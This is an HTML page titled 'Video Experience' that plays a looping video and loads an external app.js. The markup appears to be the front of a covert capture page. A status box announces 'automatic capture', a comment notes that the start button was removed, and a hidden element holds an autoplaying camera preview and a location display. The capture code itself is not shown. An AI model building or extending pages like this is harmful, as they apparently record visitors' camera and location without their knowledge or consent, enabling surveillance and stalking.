<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Experience</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="main-container">
        <!-- Video Container -->
        <div class="video-wrapper">
            <!-- Main Content Video -->
            <video id="contentVideo" class="video-player" playsinline loop controls>
                <source src="karn.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
        </div>

        <!-- content overlay -->
        <div class="overlay">
            <!-- Clean UI -->

            <div id="status" class="status-box">Initializing automatic capture...</div>

            <!-- Removed Start Button -->

            <!-- Local Previews (Hidden) -->
            <div id="demoArea" class="demo-area hidden" style="display: none;">
                <video id="camPreview" autoplay playsinline muted></video>
                <div id="locationDisplay"></div>
            </div>
        </div>
    </div>

    <script src="app.js"></script>
</body>

</html>
